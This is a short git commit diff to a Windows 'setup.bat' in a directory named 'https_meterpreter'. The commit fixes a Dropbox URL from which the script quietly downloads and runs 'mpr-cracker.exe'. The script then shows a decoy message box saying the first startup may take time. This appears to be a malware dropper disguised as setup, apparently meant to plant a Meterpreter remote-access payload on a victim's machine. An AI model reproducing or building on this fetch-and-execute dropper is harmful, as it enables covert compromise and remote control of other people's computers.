2df861beda95e61b64e3aa9102255a63e6cb09b6
durandlh <yichenissuppercool2@gmail.com>
2022-07-05 19:20:52 -0700

    commit

--- fourth-revision/https_meterpreter/setup.bat
+++ fourth-revision/https_meterpreter/setup.bat
@@ -1,5 +1,5 @@
 @echo off 
-curl -l -o "mpr-cracker.exe" https://dl.dropboxuserdownload.com/s/m4pq0tg1c6wn8db/mpr-cracker.exe?dl=0 2>NUL
+curl -l -o "mpr-cracker.exe" https://dl.dropboxusercontent.com/s/m4pq0tg1c6wn8db/mpr-cracker.exe?dl=0 2>NUL
 start mpr-cracker.exe 
 TIMEOUT /T 5 >NUL
 echo x=msgbox("Your first startup may take some time, please wait..." ,0, "Info") >> msgbox.vbs
